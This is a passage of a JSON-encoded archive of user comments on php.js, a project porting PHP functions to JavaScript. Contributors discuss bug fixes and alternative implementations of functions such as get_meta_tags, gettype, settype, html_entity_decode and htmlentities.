to\nentities['8853'] = '&oplus;';\t\/\/ Circled plus. Also known as direct sum\nentities['8855'] = '&otimes;';\t\/\/ Circled times. Also known as vector product\nentities['8869'] = '&perp;';\t\t\/\/ Up tack. Also known as orthogonal to and perpendicular\nentities['8901'] = '&sdot;';\t\t\/\/ Dot operator. The dot operator is not the same character as U+00B7 middle dot\n\/\/ Miscellaneous Technical\nentities['8968'] = '&lceil;';\t\/\/ Left ceiling. Also known as an APL upstile\nentities['8969'] = '&rceil;';\t\/\/ Right ceiling\nentities['8970'] = '&lfloor;';\t\/\/ left floor. Also known as APL downstile\nentities['8971'] = '&rfloor;';\t\/\/ Right floor\nentities['9001'] = '&lang;';\t\t\/\/ Left-pointing angle bracket. Also known as bra. Lang is not the same character as U+003C 'less than'or U+2039 'single left-pointing angle quotation mark'\nentities['9002'] = '&rang;';\t\t\/\/ Right-pointing angle bracket. Also known as ket. Rang is not the same character as U+003E 'greater than' or U+203A 'single right-pointing angle quotation mark'\n\/\/ Geometric Shapes\nentities['9642'] = '&#9642;';\t\/\/ Black small square\nentities['9643'] = '&#9643;';\t\/\/ White small square\nentities['9674'] = '&loz;';\t\t\/\/ Lozenge\n\/\/ Miscellaneous Symbols\nentities['9702'] = '&#9702;';\t\/\/ White bullet\nentities['9824'] = '&spades;';\t\/\/ Black (filled) spade suit\nentities['9827'] = '&clubs;';\t\/\/ Black (filled) club suit. Also known as shamrock\nentities['9829'] = '&hearts;';\t\/\/ Black (filled) heart suit. Also known as shamrock\nentities['9830'] = '&diams;';   \/\/ Black (filled) diamond suit\n[\/CODE]"},{"date":"2012-04-23 14:51:17","author":"????? ????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas   \n"}],"get_meta_tags":[{"date":"2009-06-07 18:33:02","author":"Raphael (Ao) RUDLER","url":"- working on it","comment":"Hi, \n\nI noticed warnings under ie7 under vista for this function.\nI had to replace :\n[CODE]fulltxt= this.file_get_contents(file).match(\/^[^]*<\\\/head>\/i);[\/CODE]\nby \n[CODE]fulltxt= this.file_get_contents(file).match('\/^[^]*<\\\/head>\/i');[\/CODE]\n\nbytheway, thanks for all that work you made."},{"date":"2009-06-08 02:02:45","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Sorry, there had been several bugs in the latest versions of get_meta_tags() and file_get_contents() on which it depended. Those should all be fixed those now, so please use the latest copies for these. However, your own suggested fix will not work because that is no longer a regular expression and became instead a string (that text will no doubt never be found).\n\nExplorer apparently has a problem if a negated character class in a regular expression is empty (e.g., [^]). We use a negated character because 1) We want to use something equivalent to the \".\" (any character) until we reach the text after it that we do want, but... 2) we want to reach across multiple lines (and the 'm' flag, does not, as is frequently supposed, do this). Although it doesn't look like any character is explicitly forbidden in HTML (only XHTML), since we have to add some character, I added the null control character \\u0000. If someone knows another better unlikely character or approach, let us know, but I think that should be a safe bet for now.\n\nThanks for reporting the issue."},{"date":"2009-06-08 02:18:54","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Ok, came across a better trick than the already-pretty-safe negation I was using...Just use [\\s\\S] which allows a single character to be either a whitespace (including newilne) or non-whitespace--in other words anything..."},{"date":"2009-06-17 20:55:15","author":"Raphael (Ao) RUDLER","url":"","comment":"works effectively better :)"},{"date":"2011-08-21 22:28:00","author":"????? ??????","url":"http:\/\/www.iraqni.com","comment":"thank you the function is good"},{"date":"2011-08-23 06:52:33","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"\u062f\u0631\u062f\u0634\u0629 \u0639\u0631\u0627\u0642\u0646\u0627: Glad you liked it!"}],"getdate":[{"date":"2011-09-21 16:49:30","author":"MemtechLodhi","url":"","comment":"Hello Everyone,\nPlease check out this link ...http:\/\/mindstick.com\/Articles\/74a106c6-47ae-4b02-9f77-2fab0de00061\/?Entering%20current%20date%20in%20existing%20html%20control%20by%20using%20java%20script for more details on getdate() function in javascript\nThanks !!!! "}],"gettype":[{"date":"2009-01-13 18:12:14","author":"Onno Marsman","url":"","comment":"Because of the way is_array is implemented this function will never return 'object'. The call to is_object is now useless."},{"date":"2009-01-14 10:38:32","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Yes but since this was such a controversial issue, I really do like to have that check in place.\r\n\r\nJust like we now wish that we had implemented is_array in every function before so that we get only one point of control we need to update when a decision is made."},{"date":"2009-01-15 20:44:04","author":"Onno Marsman","url":"","comment":"Unless you really want to check the javascript type. I guess functions that check for the type array really do this to make a distinction between associative array like objects and real javascript arrays. So I don't really think there is a problem..."},{"date":"2009-01-24 11:02:10","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Here's settype() following PHP behavior\r\n\r\n[CODE=&quot;Javascript&quot;]\/\/ Credits to Crockford also\r\n\/\/ only works on global variables, and &quot;vr&quot; must be passed in as a string\r\nfunction settype (vr, type) {\r\n    function is_array(arr) {\r\n        return typeof arr === 'object' &amp;&amp; typeof arr.length === 'number' &amp;&amp;\r\n                    !(arr.propertyIsEnumerable('length')) &amp;&amp;\r\n                    typeof arr.splice === 'function'\r\n    }\r\n    v = this[vr];\r\n    try {\r\n        switch(type) {\r\n            case 'boolean':\r\n                if (is_array(v) &amp;&amp; v.length === 0) {this[vr]=false;}\r\n                else if (v === '0') {this[vr]=false;}\r\n                else if (typeof v === 'object' &amp;&amp; !is_array(v)) {\r\n                    var lgth = false;\r\n                    for (var i in v) {\r\n                        lgth = true;\r\n                    }\r\n                    this[vr]=lgth;\r\n                }\r\n                else {this[vr] = !!v;}\r\n                break;\r\n            case 'integer':\r\n                if (typeof v === 'number') {this[vr]=parseInt(v, 10);}\r\n                else if (typeof v === 'string') {\r\n                    var mtch = v.match(\/^([+-]?)(\\d+)\/);\r\n                    if (!mtch) {this[vr]=0;}\r\n                    else {this[vr]=parseInt(v, 10);}\r\n                }\r\n                else if (v === true) {this[vr]=1;}\r\n                else if (v === false || v === null) {this[vr]=0;}\r\n                else if (is_array(v) &amp;&amp; v.length === 0) {this[vr]=0;}\r\n                else if (typeof v === 'object') {this[vr]=1;}\r\n                break;\r\n            case 'float':\r\n                if (typeof v === 'string') {\r\n                    var mtch = v.match(\/^([+-]?)(\\d+(\\.\\d+)?|\\.\\d+)([eE]\\d+)?\/);\r\n                    if (!mtch) {this[vr]=0;}\r\n                    else {this[vr]=parseFloat(v, 10);}\r\n                }\r\n                else if (v === true) {this[vr]=1;}\r\n                else if (v === false || v === null) {this[vr]=0;}\r\n                else if (is_array(v) &amp;&amp; v.length === 0) {this[vr]=0;}\r\n                else if (typeof v === 'object') {this[vr]=1;}\r\n                break;\r\n            case 'string':\r\n                if (v === null || v === false) {this[vr]='';}\r\n                else if (is_array(v)) {this[vr]='Array';}\r\n                else if (typeof v === 'object') {this[vr]='Object';}\r\n                else if (v === true) {this[vr]='1';}\r\n                else {this[vr] += '';} \/\/ numbers (and functions?)\r\n                break;\r\n            case 'array':\r\n                if (v === null) {this[vr] = [];}\r\n                else if (typeof v !== 'object') {this[vr] = [v];}\r\n                break;\r\n            case 'object':\r\n                if (v === null) {this[vr]={};}\r\n                else if (is_array(v)) {\r\n                    for (var i=0, obj={}; i &lt; v.length; i++) {\r\n                        obj[i] = v;\r\n                    }\r\n                    this[vr] = obj;\r\n                }\r\n                else if (typeof v !== 'object') {this[vr]={scalar:v};}\r\n                break;\r\n            case 'null':\r\n                delete this[vr];\r\n                break;\r\n        }\r\n        return true;\r\n    }\r\n    catch (e) {\r\n        return false;\r\n    }\r\n} \r\nvar a =5;\r\nsettype('a', 'object');\r\nalert(typeof a);[\/CODE]"},{"date":"2009-01-24 11:05:22","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Missing a semicolon with return in is_array..."},{"date":"2009-01-24 11:09:50","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"By the way, you can get doubleval() by returning floatval() on it, and get is_double() by returning is_float(). \r\n\r\nI think you should change get_resource_type() and is_resource() to not porting (unless you just want to return false for the latter!), since JavaScript doesn't have the resource type."},{"date":"2009-01-24 11:12:13","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Sorry, I see you already have is_double(), but you CAN add is_real() as an alias of is_float()..."},{"date":"2009-01-24 12:22:20","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"The regular expression line under 'float' should be changed to this:\r\n\r\nvar mtch = v.match(\/^([+-]?)(\\d+(\\.\\d+)?|\\.\\d+)([eE][+-]?\\d+)?\/);\r\n\r\n(Had forgotten the +\/- after exponent...)"},{"date":"2009-01-25 15:11:10","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Processed everything: still having a bit of a problem with the first testcase. It continues to return 5bar but I will look into it."},{"date":"2009-01-25 15:45:18","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: For some reason when it reaches case 'integer', I can't set the this[vr] to anything anymore. Strange, because the other (var bar)  example does work.\r\n\r\nAnd by the way, I believe congratulations are in order Brett: \r\nhttp:\/\/phpjs.org\/authors\/index :)\r\n\r\nI'm going to do some work on the site now, Pedro Sland has supplied a jquery component to the compiler I'm anxious to wire up."},{"date":"2009-01-26 01:32:43","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir &amp; Onno Marsman: Can't submit yet, but actually made some progress with the UI today:\r\nhttp:\/\/phpjs.org\/packages\/configure\r\n\r\nYou can play around with the get_html_translation_table, html_entity_decode, htmlentities, htmlspecialchars, htmlspecialchars_decode a bit to get the idea.\r\n\r\nI personally would like to focus my time a bit more towards the site for now. Brett, is it an idea we get you SVN access? We don't always agree on implementations but I'm sure by now you have a solid understanding beforehand of what functions are controversial in the eyes of Onno &amp; myself. We could always talk about it then.\r\n\r\nThis way you can directly patch\/add your functions, and I can use my IDE primarily for phpjs.org for the time being. If not: no problem at all, Just let me know ok? Might as well pimp you to core member if you're interested (in fact there's no real difference, just the name) :)"},{"date":"2009-01-28 14:09:12","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Yes, this function won't work unless you pass the variable as a string (and then only if the variable is in a global context). There's no other way to change the type of the variable by reference like that, so that was the only way we can mimic the PHP behavior here. \r\n\r\n[CODE=&quot;Javascript&quot;]\r\n$foo = &quot;5bar&quot;; \/\/ string\r\n$bar = true;   \/\/ boolean\r\nsettype('$foo', &quot;integer&quot;); \/\/ $foo is now 5   (integer)\r\nalert(typeof $foo); \/\/ number\r\nsettype('$bar', &quot;string&quot;);  \/\/ $bar is now &quot;1&quot; (string)\r\nalert(typeof $bar); \/\/ string\r\n[\/CODE]"},{"date":"2009-04-28 08:50:03","author":"KELAN","url":"","comment":"[CODE]\r\nfunction gettype(mixed_var){\r\n\tswitch (Object.prototype.toString.apply(mixed_var)){\r\n\t\tcase '[object Array]'\t: return 'array';\r\n\t\tcase '[object Function]': return 'function';\r\n\t\tcase '[object String]'\t: return 'string';\r\n\t\tcase '[object RegExp]'\t: return 'regexp';\r\n\t\tcase '[object Boolean]'\t: return 'boolean';\r\n\t\tcase '[object Date]'\t: return 'date';\r\n\t\tcase '[object Math]'\t: return 'math';\r\n\t\tcase '[object Number]'\t: {\r\n\t\t\tif (parseFloat(mixed_var) != parseInt(mixed_var)) return 'double';\r\n\t\t\telse return 'integer';\r\n\t\t}\r\n\t\tcase '[object Object]'\t: {\r\n\t\t\tif(mixed_var===undefined)return 'undefined';\r\n\t\t\telse if(mixed_var==null)return 'NULL';\r\n\t\t\telse return 'object';\r\n\t\t}\r\n\t\tdefault : return 'unknown type';\r\n\t}\r\n}\r\n\r\n[\/CODE]"},{"date":"2009-04-29 15:26:56","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ KELAN: I noticed your version relies on toString. This raises a question for me. What if people supply objects that actually return some custom string?"},{"date":"2009-04-30 06:17:56","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@KELAN, While it is a nice try and would probably work in most cases, I agree with Kevin that we should avoid relying on the default toString() implementation. See the discussion for is_array() for possible solutions to the perennial challenge with arrays.  :)  However, I do agree with your desire to allow testing for Date, RegExp and along with simplifying our implementation I've added support for these and also our own resource type: http:\/\/trac.phpjs.org\/projects\/phpjs\/browser\/trunk\/functions\/var\/gettype.js  Thanks!"},{"date":"2012-04-30 08:14:11","author":"CoursesWeb","url":"http:\/\/www.coursesweb.net","comment":"Hi,\nTo get and also check the type of a variable, I use this:\n[code]\nfunction gettype(obj, type) {\n  \/\/ www.coursesweb.net\/javascript\/\n  \/\/ if type not specified (null), returns a string with the object (obj) type\n  if(type == null) return obj.constructor.toString().split(' ')[1].replace(\/\\(\\)\/g,'').toLowerCase();\n  else {\n    \/\/returns true if is it is type, else, false\n    if (obj.constructor.toString().match(new RegExp(type, 'i', 'g'))) return true;\n    else return false;\n  }\n}\n[\/code]\n - If the type of \"obj\" is the name specified in the \"type\" parameter, the function returns True, otherwise, returns False.\n- If no argument specified for \"type\", the function returns a string with the type of \"obj\""}],"html_entity_decode":[{"date":"2008-03-15 22:25:26","author":"ger","url":"","comment":"heh... I almost sure a can see some js code after the return...; in the function source listed at this page."},{"date":"2008-03-15 23:48:52","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ ger: Aha that was ugly. Thanks for helping us!"},{"date":"2008-03-18 01:47:53","author":"john","url":"","comment":"ha, sry about that!"},{"date":"2008-03-19 09:14:28","author":"lubber","url":"","comment":"you can find the javascript equivalents for gz_inflate and gz_deflate here\r\n\r\nhttp:\/\/www.onicos.com\/staff\/iz\/amuse\/javascript\/expert\/inflate.txt\r\nhttp:\/\/www.onicos.com\/staff\/iz\/amuse\/javascript\/expert\/deflate.txt"},{"date":"2008-03-19 16:29:52","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ lubber: Wow that is some awesome code and I will definitely save the links. However, the 2 functions are probably rarely used in JavaScript. That hasn't stopped me before, but in this case the 2 functions alone (72kB) will increase the total project size by 52%. That's a bit to much for now.\r\n\r\nHowever, when php.js gets a page for component customization, I will include the functions and just leave them unchecked by default. Sounds good?"},{"date":"2008-03-20 06:43:58","author":"lubber","url":"","comment":"@Kevin: i use these functions to shrink my GET-Parameters in cases where POST wasnt possible (imagine an img-tag which will generate a custom picture and the parameters will exceed the 2048 url-chars limit on IE (that was the case for me)) Anyway, i just wanted to contribute my 2cent for this project :)"},{"date":"2008-03-20 15:06:39","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@lubber: You sure did! And as I said, as soon as php.js supports optional components, I will include them. Thanks again!"},{"date":"2008-06-23 11:58:42","author":"rekcor","url":"","comment":"Thanks for the code!\r\n\r\nBut shouldn't you destroy \r\n\r\n[code]tarea[\/code]\r\n\r\n(otherwise we will end up with n numbers of textareas floating around in the DOM's hyperspace)"},{"date":"2008-10-15 15:15:33","author":"marc andreu","url":"","comment":"Hi I needed to deal with secodn parameter of html_entity_decode() funcion, and I added it as follows. I hope to be right, however it's a suggestion. That's all folks. \r\n\r\n\/\/ {{{ html_entity_decode\r\nfunction html_entity_decode(string, quote_style ) {\r\n    \/\/ Convert all HTML entities to their applicable characters\r\n    \/\/ \r\n    \/\/ +    discuss at: http:\/\/kevin.vanzonneveld.net\/techblog\/article\/javascript_equivalent_for_phps_html_entity_decode\/\r\n    \/\/ +       version: 810.621\r\n    \/\/ +   original by: john (http:\/\/www.jd-tech.net)\r\n    \/\/ +      input by: ger\r\n    \/\/ +   improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ +    revised by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ +   bugfixed by: Onno Marsman\r\n    \/\/ %          note: table from http:\/\/www.the-art-of-web.com\/html\/character-codes\/\r\n    \/\/ *     example 1: html_entity_decode('Kevin &amp;amp; van Zonneveld');\r\n    \/\/ *     returns 1: 'Kevin &amp; van Zonneveld'\r\n\r\n    var histogram = {}, histogram_r = {}, code = 0;\r\n    var entity = chr = '';\r\n\r\n    histogram['34'] = 'quot';\r\n    histogram['38'] = 'amp';\r\n    histogram['60'] = 'lt';\r\n    histogram['62'] = 'gt';\r\n    histogram['160'] = 'nbsp';\r\n    histogram['161'] = 'iexcl';\r\n    histogram['162'] = 'cent';\r\n    histogram['163'] = 'pound';\r\n    histogram['164'] = 'curren';\r\n    histogram['165'] = 'yen';\r\n    histogram['166'] = 'brvbar';\r\n    histogram['167'] = 'sect';\r\n    histogram['168'] = 'uml';\r\n    histogram['169'] = 'copy';\r\n    histogram['170'] = 'ordf';\r\n    histogram['171'] = 'laquo';\r\n    histogram['172'] = 'not';\r\n    histogram['173'] = 'shy';\r\n    histogram['174'] = 'reg';\r\n    histogram['175'] = 'macr';\r\n    histogram['176'] = 'deg';\r\n    histogram['177'] = 'plusmn';\r\n    histogram['178'] = 'sup2';\r\n    histogram['179'] = 'sup3';\r\n    histogram['180'] = 'acute';\r\n    histogram['181'] = 'micro';\r\n    histogram['182'] = 'para';\r\n    histogram['183'] = 'middot';\r\n    histogram['184'] = 'cedil';\r\n    histogram['185'] = 'sup1';\r\n    histogram['186'] = 'ordm';\r\n    histogram['187'] = 'raquo';\r\n    histogram['188'] = 'frac14';\r\n    histogram['189'] = 'frac12';\r\n    histogram['190'] = 'frac34';\r\n    histogram['191'] = 'iquest';\r\n    histogram['192'] = 'Agrave';\r\n    histogram['193'] = 'Aacute';\r\n    histogram['194'] = 'Acirc';\r\n    histogram['195'] = 'Atilde';\r\n    histogram['196'] = 'Auml';\r\n    histogram['197'] = 'Aring';\r\n    histogram['198'] = 'AElig';\r\n    histogram['199'] = 'Ccedil';\r\n    histogram['200'] = 'Egrave';\r\n    histogram['201'] = 'Eacute';\r\n    histogram['202'] = 'Ecirc';\r\n    histogram['203'] = 'Euml';\r\n    histogram['204'] = 'Igrave';\r\n    histogram['205'] = 'Iacute';\r\n    histogram['206'] = 'Icirc';\r\n    histogram['207'] = 'Iuml';\r\n    histogram['208'] = 'ETH';\r\n    histogram['209'] = 'Ntilde';\r\n    histogram['210'] = 'Ograve';\r\n    histogram['211'] = 'Oacute';\r\n    histogram['212'] = 'Ocirc';\r\n    histogram['213'] = 'Otilde';\r\n    histogram['214'] = 'Ouml';\r\n    histogram['215'] = 'times';\r\n    histogram['216'] = 'Oslash';\r\n    histogram['217'] = 'Ugrave';\r\n    histogram['218'] = 'Uacute';\r\n    histogram['219'] = 'Ucirc';\r\n    histogram['220'] = 'Uuml';\r\n    histogram['221'] = 'Yacute';\r\n    histogram['222'] = 'THORN';\r\n    histogram['223'] = 'szlig';\r\n    histogram['224'] = 'agrave';\r\n    histogram['225'] = 'aacute';\r\n    histogram['226'] = 'acirc';\r\n    histogram['227'] = 'atilde';\r\n    histogram['228'] = 'auml';\r\n    histogram['229'] = 'aring';\r\n    histogram['230'] = 'aelig';\r\n    histogram['231'] = 'ccedil';\r\n    histogram['232'] = 'egrave';\r\n    histogram['233'] = 'eacute';\r\n    histogram['234'] = 'ecirc';\r\n    histogram['235'] = 'euml';\r\n    histogram['236'] = 'igrave';\r\n    histogram['237'] = 'iacute';\r\n    histogram['238'] = 'icirc';\r\n    histogram['239'] = 'iuml';\r\n    histogram['240'] = 'eth';\r\n    histogram['241'] = 'ntilde';\r\n    histogram['242'] = 'ograve';\r\n    histogram['243'] = 'oacute';\r\n    histogram['244'] = 'ocirc';\r\n    histogram['245'] = 'otilde';\r\n    histogram['246'] = 'ouml';\r\n    histogram['247'] = 'divide';\r\n    histogram['248'] = 'oslash';\r\n    histogram['249'] = 'ugrave';\r\n    histogram['250'] = 'uacute';\r\n    histogram['251'] = 'ucirc';\r\n    histogram['252'] = 'uuml';\r\n    histogram['253'] = 'yacute';\r\n    histogram['254'] = 'thorn';\r\n    histogram['255'] = 'yuml';\r\n\r\n    \/\/ Reverse table. Cause for maintainability purposes, the histogram is\r\n    \/\/ identical to the one in htmlentities.\r\n    for (code in histogram) {\r\n        entity = histogram[code];\r\n        histogram_r[entity] = code;\r\n    }\r\n    \r\n    var retTemp = (string+'').replace(\/(\\&amp;([a-zA-Z]+)\\;)\/g, function(full, m1, m2){\r\n        if (m2 in histogram_r) {\r\n            return String.fromCharCode(histogram_r[m2]);\r\n        } else {\r\n            return m2;\r\n        }\r\n    });\r\n    \r\n    \/\/Add for Marc Andreu Fernadnez. To decode quotes.\r\n    \/\/ Encode depending on quote_style\r\n    if (quote_style == 'ENT_QUOTES') {\r\n        retTemp = retTemp.replace('&amp;quot;','&quot;');\r\n        retTemp = retTemp.replace('&amp;#039;',&quot;'&quot;);\r\n    } else if (quote_style != 'ENT_NOQUOTES') {\r\n        \/\/ All other cases (ENT_COMPAT, default, but not ENT_NOQUOTES)\r\n        retTemp = retTemp.replace('&amp;quot;','&quot;');\r\n    } \r\n    \r\n    return retTemp;\r\n}\/\/ }}}"},{"date":"2008-10-20 18:36:56","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ marc andreu: I've revised all of the functions like get_html_translation_table, htmlentities &amp; htmlspecialchars and their decoding counterparts, they now also support your second argument. Thank you!"},{"date":"2008-12-30 16:56:14","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Azriel Fasten: You reported a bug by mail, that is exactly the same as the real PHP encountered at one point: http:\/\/bugs.php.net\/bug.php?id=25707 \r\n\r\nI've read the bug report more thorough, and applied the same fix as was proposed there.\r\nI put the &amp; entity at the bottom of the histogram.\r\n\r\nFaster ways to replace (without using regex) can still be explored."},{"date":"2008-12-30 18:05:39","author":"Azriel Fasten","url":"","comment":"I think that perhaps the replace should be relegated to str_replace, and that function should be highly optimized. Many other parts of the library all use different ways of replacing. These should all use str_replace."},{"date":"2008-12-31 12:35:26","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Azriel Fasten: Yes but that would also make it harder for people to just copy 1 function:\r\nhttp:\/\/trac.plutonia.nl\/projects\/phpjs\/wiki\/DeveloperGuidelines#DependencyvsRedundancy\r\n\r\nThe less dependencies the better, but of course we are not about to duplicate the histogram from get_html_translation_table 4 times, so dependencies are already made in this function family.\r\n\r\nI think we should probably first come up with the fastest str_replace as possible. And base our decision (Dependency vs Redundancy) on the final algorithm used."},{"date":"2009-06-03 22:22:14","author":"?ukasz Czerwi?ski","url":"","comment":"I have noticed that &#039; is decoded by html_entity_decode() as ' (apostrophe), but &#39; isn't!!! (of course when using 'ENT_QUOTES') The same problem is with htmlspecialchars_decode(). I have checked that in PHP decodes both &#039; and &#39; I tried to find the code in PHP sources, but they seems to be veery complicated. I have only found a structure that stores several entities - those decoded by htmlspecialchars_decode:\nphp-5.2.9.tar.bz2\/ext\/standard\/html.c, lines 454-466\n[CODE]\nstatic const struct {\n\tunsigned short charcode;\n\tchar *entity;\n\tint entitylen;\n\tint flags;\n} basic_entities[] = {\n\t{ '\"',\t\"&quot;\",\t6,\tENT_HTML_QUOTE_DOUBLE },\n\t{ '\\'',\t\"&#039;\",\t6,\tENT_HTML_QUOTE_SINGLE },\n\t{ '\\'',\t\"&#39;\",\t5,\tENT_HTML_QUOTE_SINGLE },\n\t{ '<',\t\"&lt;\",\t\t4,\t0 },\n\t{ '>',\t\"&gt;\",\t\t4,\t0 },\n\t{ 0, NULL, 0, 0 }\n};\n[\/CODE]\n\nAs you can see, both &#039; and &#39; are listed.\nIn case of JS code of these two functions (in fact I think we should modify get_html_transition_table), the modification is quite complicated...\n\n"},{"date":"2009-06-04 01:48:09","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Hello ?ukasz (Kevin, a Unicode bug?--otherwise, I can't credit this person for \"input by\"),\n\nI did modify get_html_translation_table() to keep the order of what PHP returns for that function (and as a result removed the hack within this and other functions for adding &amp;amp; at the end). One catch is that although get_html_translation_table() returns &amp;#39;, the functions we use like htmlspecialchars, return &amp;#039;. But we cannot modify get_html_translation_table() to add &amp;#039; since that histogram (correctly) is keyed with an apostrophe leading necessarily to only one value (&amp;#39;). \n\nSo, we have to modify the functions to work with &amp;#039; as well (which is not a problem really since this is the only numeric character reference in the list (&amp;apos; is XML-only, so it couldn't be used)).\n\nSo, I've fixed htmlspecialchars_decode() and html_entity_decode() to work with both &amp;#039; and &amp;#39; and also \"fixed\" htmlspecialchars() and htmlentities() to use &amp;#039; for output as they do in PHP (without modifying get_html_translation_table() which uses &amp;#39;).\n\nI think that should address all the issues."},{"date":"2009-06-10 14:46:15","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Good job man! I'm thinking the only place left that could screw us with unicode is mysql. I've changed the table collation to utf8_unicode_ci. Let's see if things improve."},{"date":"2009-06-10 23:14:34","author":"Brett Zamir (test: ????? )","url":"http:\/\/bahai-library.com","comment":"@Kevin, do you have the \"SET NAMES 'UTF8'\" going too? (trying a few characters out) ?????"},{"date":"2009-06-10 23:15:30","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Nope, still not working, as indicated by my test characters..."},{"date":"2009-06-18 13:03:04","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: YEah I already have:\n\nclass DATABASE_CONFIG {\n    var $default = array(\n        'driver' => 'mysql',\n        '....',\n        'encoding' => 'utf8',\n    );\n\nin my cake datasource which should execute that statement ever time. I'm kind of puzzled what else I need to make utf8 aware to avoid these question marks.."},{"date":"2009-08-20 11:10:45","author":"pedro","url":"","comment":"thank you very much for this function is what I needed to resolve my problem. thkx"},{"date":"2012-05-06 09:34:48","author":"????? ???????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas \n"}],"htmlentities":[{"date":"2008-03-15 06:20:53","author":"john","url":"","comment":"here is the reverse function \r\n(     html_entity_decode()    )\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction html_entity_decode(str) {\r\n\t\/\/jd-tech.net\r\n\tvar\ttarea=document.createElement('textarea');\r\n\t\ttarea.innerHTML = str; return tarea.value;\r\n\t\ttarea.parentNode.removeChild(tarea);\r\n\t}\r\n[\/CODE]"},{"date":"2008-03-15 11:54:04","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ john: A new function, great! Thanks a lot john!"},{"date":"2008-05-15 22:22:57","author":"Nietzsche's Tears","url":"","comment":"Tested on Safari 3.1.1 and Firefox 2.0.0.14. Function fails to convert &quot;copyright&quot; and &quot;registered&quot; symbols to their equivalent HTML entities."},{"date":"2008-09-11 10:15:30","author":"nobbler","url":"","comment":"using 'var i' instead of only 'i' in the for loop could prevent from overwriting global 'i', even though no one should use it. But well, i did, and found another error on that way, so it kinda helpt me :)"},{"date":"2008-09-13 15:39:08","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ nobbler: Haha, ok, well still adding the var. Thank you!"},{"date":"2009-03-04 21:53:40","author":"Bjorn Roesbeke","url":"http:\/\/www.bjornroesbeke.be","comment":"F.e. a single quote with entity &amp;#039; isn't converted correctly.\r\n[CODE=&quot;Javascript&quot;]htmlentities(&quot;foo'bar&quot;,&quot;ENT_QUOTES&quot;);[\/CODE]\r\nwill return foo&amp;amp;#039;"},{"date":"2009-03-22 18:59:01","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Bjorn Roesbeke: I've added your testcase, but it succeeds. Are you sure you're running the latest version?"},{"date":"2009-08-24 13:16:29","author":"vikal","url":"braindigit.com","comment":"hi\n\ni have used your code to convert <!----> into html entities..\n\nbut it does not work neither it return what i need.\n\ni have used your code as it descripted in examples\n\nlike this\n\n\nfunction htmlentities (string) {\n    \/\/ Convert all applicable characters to HTML entities  \n    \/\/ \n    \/\/ version: 907.503\n    \/\/ discuss at: http:\/\/phpjs.org\/functions\/htmlentities\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n    \/\/ +    revised by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n    \/\/ +   improved by: nobbler\n    \/\/ +    tweaked by: Jack\n    \/\/ +   bugfixed by: Onno Marsman\n    \/\/ +    revised by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n    \/\/ +    bugfixed by: Brett Zamir (http:\/\/brett-zamir.me)\n    \/\/ +      input by: Ratheous\n    \/\/ -    depends on: get_html_translation_table\n    \/\/ *     example 1: htmlentities('Kevin & van Zonneveld');\n    \/\/ *     returns 1: 'Kevin &amp; van Zonneveld'\n    \/\/ *     example 2: htmlentities(\"foo'bar\",\"ENT_QUOTES\");\n    \/\/ *     returns 2: 'foo&#039;bar'\n    var hash_map = {}, symbol = '', tmp_str = '', entity = '';\n    tmp_str = string.toString();\n    \n    if (false === (hash_map = this.get_html_translation_table('HTML_ENTITIES', 'ENT_COMPAT'))) {\n        return false;\n    }\n     for (symbol in hash_map) {\n        entity = hash_map[symbol];\n        tmp_str = tmp_str.split(symbol).join(entity);\n    }\n    \n    return tmp_str;\n}\n\nincluding function get_html_translation_table() as it is\n\nso would you mind telling how does it works\n\nwaiting for your response\n\nbest regards\n\nvikal acharya"},{"date":"2009-08-26 07:50:05","author":"vikal","url":"www.braindigit.com","comment":"hi\n\nReally good work that you people accomplished.\n\nso useful and i am happy to use it.\n\nthanks\n\nbest regards\n\nvikal acharya\n"},{"date":"2009-08-26 